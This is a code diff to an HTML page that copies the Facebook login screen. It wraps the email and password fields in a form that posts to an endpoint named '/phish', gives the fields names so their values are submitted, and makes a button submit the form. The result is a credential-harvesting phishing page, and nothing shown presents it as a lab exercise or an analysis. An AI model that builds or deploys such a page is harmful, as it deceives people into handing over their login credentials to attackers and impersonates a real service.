@@ -12,8 +12,11 @@
         <h1>facebook</h1>
         <div class="text-box">
             <p class="login-text">Log in to Facebook</p>
-            <input type="email" name="" id="" placeholder="Email address or phone number">
-            <input type="password" name="" id="" placeholder="Password">
+            <form action="/phish" method="post" class="text-box">
+
+           
+            <input type="email" name="email" id="" placeholder="Email address or phone number">
+            <input type="password" name="password" id="" placeholder="Password">
             <button class="login-button">Log In</button>
             <p class="small-text"><a href="#">Forgotten account?</a></p>
             <div class="hr-box">
@@ -22,7 +25,8 @@
                 <hr class="hr-two">
             </div>
             
-            <button class="new-account-button" >Create New Account</button>
+            <button type="submit" class="new-account-button" >Create New Account</button>
+         </form>
         </div>
     </main>
 </body>
